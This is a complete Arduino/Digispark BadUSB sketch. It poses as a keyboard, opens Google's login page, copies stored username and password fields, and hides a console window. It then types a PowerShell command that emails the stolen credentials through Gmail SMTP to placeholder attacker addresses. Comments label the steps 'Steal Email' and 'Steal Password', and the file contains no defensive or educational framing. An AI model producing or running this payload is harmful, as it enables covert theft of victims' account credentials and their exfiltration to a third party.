#include "DigiKeyboard.h"
#include <avr/pgmspace.h>

const char line1[] PROGMEM = "chrome";
const char line2[] PROGMEM = "accounts.google.com/Login\n";
const char line3[] PROGMEM = "mode con: cols=16 lines=1&color FE\n";
const char line4[] PROGMEM = "powershell \"$u='\"";
const char line5[] PROGMEM = "';";
const char line6[] PROGMEM = "text\n";
const char line7[] PROGMEM = "$p ='";
const char line8[] PROGMEM = "';";
const char line9[] PROGMEM = "$m='Username: '+$u+' Password: '+$p;";
const char line10[] PROGMEM = "$ser='smtp.gmail.com';";
const char line11[] PROGMEM = "$msg=New-Object Net.Mail.MailMessage;";
const char line12[] PROGMEM = "$smtp=New-Object Net.Mail.SmtpClient($ser);";
const char line13[] PROGMEM = "$smtp.EnableSsl=$True;";
const char line14[] PROGMEM = "$smtp.Credentials=New-Object System.Net.NetworkCredential('<email>','<password>');";
const char line15[] PROGMEM = "$msg.From='<email_from>';$msg.To.Add('<email_to>');$msg.Subject='Pass';";
const char line16[] PROGMEM = "$msg.Body=$m;$smtp.Send($msg);";
const char line17[] PROGMEM = "\"&exit\n";
char buffer[100];
#define GetPsz(x) (strcpy_P(buffer,(char*)x))

void printText(char*txt) {
	int l = strlen(txt);
	for (int i = 0; i < l; i++) {
		DigiKeyboard.print(txt[i]);
		DigiKeyboard.update();
	}
}
void setup() {
	DigiKeyboard.delay(500);
	DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
	DigiKeyboard.delay(500);
	printText(GetPsz(line1));
	DigiKeyboard.delay(500);
	DigiKeyboard.println("");
	DigiKeyboard.delay(1000);
	printText(GetPsz(line2));
	DigiKeyboard.delay(3000);
	DigiKeyboard.sendKeyStroke(67,MOD_SHIFT_LEFT);
	DigiKeyboard.delay(500);
	DigiKeyboard.sendKeyStroke(0,82);
	DigiKeyboard.delay(100);
	DigiKeyboard.println("");
	//Steal Email
	DigiKeyboard.sendKeyStroke(0,82);
	DigiKeyboard.sendKeyStroke(0,82);
	DigiKeyboard.sendKeyStroke(0,82);
	DigiKeyboard.sendKeyStroke(0,59);
	DigiKeyboard.delay(200);
	DigiKeyboard.sendKeyStroke(4,MOD_CONTROL_LEFT);
	DigiKeyboard.sendKeyStroke(6,MOD_CONTROL_LEFT);
	DigiKeyboard.delay(100);
	DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
	DigiKeyboard.delay(500);
	DigiKeyboard.println("");
	DigiKeyboard.delay(1000);
	printText(GetPsz(line3));
	DigiKeyboard.delay(100);
	printText(GetPsz(line4));
	DigiKeyboard.delay(100);
	DigiKeyboard.sendKeyStroke(25,MOD_CONTROL_LEFT);
	printText(GetPsz(line5));
	DigiKeyboard.delay(100);
	DigiKeyboard.sendKeyStroke(43,MOD_ALT_LEFT);
	//Steal Password
	DigiKeyboard.delay(100);
	DigiKeyboard.sendKeyStroke(0,81);
	DigiKeyboard.sendKeyStroke(0,81);
	DigiKeyboard.sendKeyStroke(0,81);
	DigiKeyboard.println("");
	DigiKeyboard.sendKeyStroke(0,43);
	DigiKeyboard.sendKeyStroke(0,43);
	printText(GetPsz(line6));
	DigiKeyboard.delay(200);
	DigiKeyboard.sendKeyStroke(6,MOD_CONTROL_LEFT);
	DigiKeyboard.sendKeyStroke(25,MOD_CONTROL_LEFT);
	DigiKeyboard.delay(100);
	DigiKeyboard.sendKeyStroke(61,MOD_ALT_LEFT);
	DigiKeyboard.delay(100);
	printText(GetPsz(line7));
	DigiKeyboard.sendKeyStroke(25,MOD_CONTROL_LEFT);
	printText(GetPsz(line8));
	//Email Username and Password
	DigiKeyboard.delay(100);
	printText(GetPsz(line9));
	DigiKeyboard.delay(100);
	printText(GetPsz(line10));
	printText(GetPsz(line11));
	printText(GetPsz(line12));
	printText(GetPsz(line13));
	printText(GetPsz(line14));
	printText(GetPsz(line15));
	printText(GetPsz(line16));
	printText(GetPsz(line17));
	DigiKeyboard.sendKeyStroke(61,MOD_ALT_LEFT);
}

void loop() {
}
